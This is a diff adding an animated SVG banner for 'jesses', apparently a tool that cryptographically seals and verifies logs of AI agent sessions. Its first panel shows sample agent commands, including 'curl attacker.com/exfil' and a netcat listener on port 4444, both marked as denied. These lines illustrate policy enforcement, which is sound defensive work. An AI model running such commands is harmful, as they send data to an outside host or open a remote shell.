@@ -1,0 +1,212 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 880 360" width="880" height="360"
+     font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, monospace" font-size="12">
+  <!-- ─────────────────────────────────────────────────────────────────────
+       jesses hero — three-panel flow: SESSION → SEAL → VERIFY
+       palette matches examples/demo-bounty/screenshots/ansi2svg.py
+       ───────────────────────────────────────────────────────────────────── -->
+
+  <defs>
+    <!-- subtle card gradient, keeps terminal-black base -->
+    <linearGradient id="card" x1="0" x2="0" y1="0" y2="1">
+      <stop offset="0" stop-color="#13161b"/>
+      <stop offset="1" stop-color="#0b0d10"/>
+    </linearGradient>
+    <!-- glow for the verdict text -->
+    <filter id="glow" x="-50%" y="-50%" width="200%" height="200%">
+      <feGaussianBlur stdDeviation="2.4" result="b"/>
+      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+  </defs>
+
+  <!-- outer frame -->
+  <rect width="880" height="360" rx="12" fill="#06080a"/>
+
+  <!-- title row -->
+  <text x="24" y="28" fill="#dde4ee" font-size="15" font-weight="600">jesses</text>
+  <text x="70" y="28" fill="#8895a6" font-size="13">cryptographic attestation for autonomous LLM agent sessions</text>
+  <text x="856" y="28" fill="#8895a6" font-size="11" text-anchor="end">v0.1 · seven gates · two implementations</text>
+
+  <!-- ═══════════════════════ PANEL 1 · SESSION ═══════════════════════ -->
+  <g transform="translate(24 54)">
+    <rect width="250" height="280" rx="10" fill="url(#card)" stroke="#1f242c"/>
+    <!-- header bar -->
+    <circle cx="14" cy="16" r="4" fill="#ff6058"/>
+    <circle cx="28" cy="16" r="4" fill="#ffbd2e"/>
+    <circle cx="42" cy="16" r="4" fill="#27c93f"/>
+    <text x="125" y="20" fill="#8895a6" font-size="11" text-anchor="middle">agent session · live hook</text>
+    <line x1="0" y1="32" x2="250" y2="32" stroke="#1f242c"/>
+
+    <!-- stream of tool events -->
+    <g font-size="11.5">
+      <!-- row 1 -->
+      <text x="14" y="54" fill="#8895a6">$</text>
+      <text x="26" y="54" fill="#dde4ee">curl api.target.com/users</text>
+      <text x="14" y="70" fill="#5fd37a">✓ allow</text>
+      <text x="72" y="70" fill="#8895a6">api.target.com</text>
+
+      <!-- row 2 -->
+      <text x="14" y="96" fill="#8895a6">$</text>
+      <text x="26" y="96" fill="#dde4ee">cat config.yaml</text>
+      <text x="14" y="112" fill="#5fd37a">✓ allow</text>
+      <text x="72" y="112" fill="#8895a6">path in scope</text>
+
+      <!-- row 3 — DENY flash -->
+      <text x="14" y="138" fill="#8895a6">$</text>
+      <text x="26" y="138" fill="#dde4ee">curl attacker.com/exfil</text>
+      <g>
+        <text x="14" y="154" fill="#e55c5c" font-weight="700">✗ DENY</text>
+        <text x="72" y="154" fill="#e55c5c" opacity="0.85">attacker.com · out-of-scope</text>
+        <!-- subtle pulse on the deny row -->
+        <animate attributeName="opacity" values="1;0.35;1" dur="1.6s" repeatCount="indefinite"/>
+      </g>
+
+      <!-- row 4 -->
+      <text x="14" y="180" fill="#8895a6">$</text>
+      <text x="26" y="180" fill="#dde4ee">curl api.target.com/pii/42</text>
+      <text x="14" y="196" fill="#5fd37a">✓ allow</text>
+      <text x="72" y="196" fill="#8895a6">api.target.com</text>
+
+      <!-- row 5 — second DENY -->
+      <text x="14" y="222" fill="#8895a6">$</text>
+      <text x="26" y="222" fill="#dde4ee">nc -lvp 4444</text>
+      <text x="14" y="238" fill="#e55c5c">✗ DENY</text>
+      <text x="72" y="238" fill="#e55c5c" opacity="0.85">/dev/tcp listener</text>
+    </g>
+
+    <!-- footer tally -->
+    <line x1="0" y1="252" x2="250" y2="252" stroke="#1f242c"/>
+    <text x="14" y="270" fill="#8895a6" font-size="11">8 events · 2 denied · 1 warned</text>
+  </g>
+
+  <!-- ═══════════════════════ arrow 1 → seal ═══════════════════════ -->
+  <g transform="translate(274 194)">
+    <!-- static rail -->
+    <line x1="0" y1="0" x2="56" y2="0" stroke="#2a3038" stroke-width="2"/>
+    <polygon points="52,-5 62,0 52,5" fill="#2a3038"/>
+    <!-- moving packet -->
+    <circle r="3.5" fill="#6ecfd9">
+      <animate attributeName="cx" values="0;56" dur="2.2s" repeatCount="indefinite"/>
+      <animate attributeName="opacity" values="0;1;1;0" keyTimes="0;0.2;0.8;1" dur="2.2s" repeatCount="indefinite"/>
+    </circle>
+  </g>
+
+  <!-- ═══════════════════════ PANEL 2 · SEAL ═══════════════════════ -->
+  <g transform="translate(336 54)">
+    <rect width="208" height="280" rx="10" fill="url(#card)" stroke="#1f242c"/>
+    <text x="104" y="20" fill="#8895a6" font-size="11" text-anchor="middle">session.jes</text>
+    <line x1="0" y1="32" x2="208" y2="32" stroke="#1f242c"/>
+
+    <!-- merkle tree viz -->
+    <g transform="translate(104 72)" stroke="#2a3038" stroke-width="1" fill="none">
+      <!-- root -->
+      <line x1="0" y1="0" x2="-42" y2="24"/>
+      <line x1="0" y1="0" x2="42"  y2="24"/>
+      <!-- inner -->
+      <line x1="-42" y1="24" x2="-64" y2="48"/>
+      <line x1="-42" y1="24" x2="-20" y2="48"/>
+      <line x1="42"  y1="24" x2="20"  y2="48"/>
+      <line x1="42"  y1="24" x2="64"  y2="48"/>
+    </g>
+    <g transform="translate(104 72)">
+      <!-- root node -->
+      <circle cx="0" cy="0" r="5" fill="#6ecfd9"/>
+      <!-- inner -->
+      <circle cx="-42" cy="24" r="3.5" fill="#8895a6"/>
+      <circle cx="42"  cy="24" r="3.5" fill="#8895a6"/>
+      <!-- leaves: 3rd one red (the denied tool call) -->
+      <circle cx="-64" cy="48" r="3" fill="#5fd37a"/>
+      <circle cx="-20" cy="48" r="3" fill="#5fd37a"/>
+      <circle cx="20"  cy="48" r="3" fill="#e55c5c"/>
+      <circle cx="64"  cy="48" r="3" fill="#5fd37a"/>
+    </g>
+
+    <!-- seal metadata -->
+    <g font-size="11" transform="translate(14 140)">
+      <text y="0"  fill="#8895a6">merkle root</text>
+      <text y="0"  x="194" text-anchor="end" fill="#6ecfd9">ab4d55a1…</text>
+
+      <text y="20" fill="#8895a6">ed25519 sig</text>
+      <text y="20" x="194" text-anchor="end" fill="#5fd37a">valid ✓</text>
+
+      <text y="40" fill="#8895a6">rekor log</text>
+      <text y="40" x="194" text-anchor="end" fill="#dde4ee">idx 4218</text>
+
+      <text y="60" fill="#8895a6">scope hash</text>
+      <text y="60" x="194" text-anchor="end" fill="#dde4ee">adb96075…</text>
+
+      <text y="80" fill="#8895a6">leaf count</text>
+      <text y="80" x="194" text-anchor="end" fill="#dde4ee">8</text>
+
+      <text y="100" fill="#8895a6">OTS anchor</text>
+      <text y="100" x="194" text-anchor="end" fill="#e8b14a">pending</text>
+    </g>
+
+    <!-- footer -->
+    <line x1="0" y1="252" x2="208" y2="252" stroke="#1f242c"/>
+    <text x="104" y="270" fill="#8895a6" font-size="11" text-anchor="middle">in-toto ITE-6 envelope · 1.8 kB</text>
+  </g>
+
+  <!-- ═══════════════════════ arrow 2 → verify ═══════════════════════ -->
+  <g transform="translate(544 194)">
+    <line x1="0" y1="0" x2="56" y2="0" stroke="#2a3038" stroke-width="2"/>
+    <polygon points="52,-5 62,0 52,5" fill="#2a3038"/>
+    <circle r="3.5" fill="#6ecfd9">
+      <animate attributeName="cx" values="0;56" dur="2.2s" begin="0.8s" repeatCount="indefinite"/>
+      <animate attributeName="opacity" values="0;1;1;0" keyTimes="0;0.2;0.8;1" dur="2.2s" begin="0.8s" repeatCount="indefinite"/>
+    </circle>
+  </g>
+
+  <!-- ═══════════════════════ PANEL 3 · VERIFY ═══════════════════════ -->
+  <g transform="translate(606 54)">
+    <rect width="250" height="280" rx="10" fill="url(#card)" stroke="#1f242c"/>
+    <text x="125" y="20" fill="#8895a6" font-size="11" text-anchor="middle">jesses verify · offline</text>
+    <line x1="0" y1="32" x2="250" y2="32" stroke="#1f242c"/>
+
+    <!-- gate list -->
+    <g font-size="11.5">
+      <g transform="translate(16 54)">
+        <text x="0" y="0" fill="#5fd37a">✓</text>
+        <text x="14" y="0" fill="#8895a6">G1</text>
+        <text x="38" y="0" fill="#dde4ee">envelope signature</text>
+      </g>
+      <g transform="translate(16 78)">
+        <text x="0" y="0" fill="#5fd37a">✓</text>
+        <text x="14" y="0" fill="#8895a6">G2</text>
+        <text x="38" y="0" fill="#dde4ee">merkle root</text>
+      </g>
+      <g transform="translate(16 102)">
+        <text x="0" y="0" fill="#5fd37a">✓</text>
+        <text x="14" y="0" fill="#8895a6">G3</text>
+        <text x="38" y="0" fill="#dde4ee">rekor pre-commit</text>
+      </g>
+      <g transform="translate(16 126)">
+        <text x="0" y="0" fill="#5fd37a">✓</text>
+        <text x="14" y="0" fill="#8895a6">G4</text>
+        <text x="38" y="0" fill="#dde4ee">scope hash</text>
+      </g>
+      <!-- G5 failing — subtle pulse -->
+      <g transform="translate(16 150)">
+        <text x="0" y="0" fill="#e55c5c" font-weight="700">✗</text>
+        <text x="14" y="0" fill="#8895a6">G5</text>
+        <text x="38" y="0" fill="#dde4ee">policy compliance</text>
+        <text x="38" y="16" fill="#e55c5c" opacity="0.85" font-size="10.5">2 of 8 events breached</text>
+        <animate attributeName="opacity" values="1;0.55;1" dur="1.6s" repeatCount="indefinite"/>
+      </g>
+      <g transform="translate(16 194)">
+        <text x="0" y="0" fill="#5fd37a">✓</text>
+        <text x="14" y="0" fill="#8895a6">G7</text>
+        <text x="38" y="0" fill="#dde4ee">deliverable provenance</text>
+      </g>
+      <g transform="translate(16 218)">
+        <text x="0" y="0" fill="#e8b14a">⚠</text>
+        <text x="14" y="0" fill="#8895a6">G6</text>
+        <text x="38" y="0" fill="#dde4ee" opacity="0.7">OTS anchor (advisory)</text>
+      </g>
+    </g>
+
+    <!-- verdict banner -->
+    <line x1="0" y1="252" x2="250" y2="252" stroke="#1f242c"/>
+    <text x="125" y="274" fill="#e55c5c" font-size="14" font-weight="700"
+          text-anchor="middle" filter="url(#glow)">✗ INVALID</text>
+  </g>
+</svg>
